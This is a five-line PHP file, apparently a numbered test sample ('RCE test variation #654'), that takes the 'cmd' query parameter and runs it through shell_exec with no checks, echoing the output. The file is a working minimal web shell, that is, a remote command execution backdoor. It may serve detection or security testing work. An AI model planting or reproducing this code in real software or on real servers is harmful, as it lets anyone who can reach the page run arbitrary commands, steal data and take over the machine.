<?php
// RCE test variation #654
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>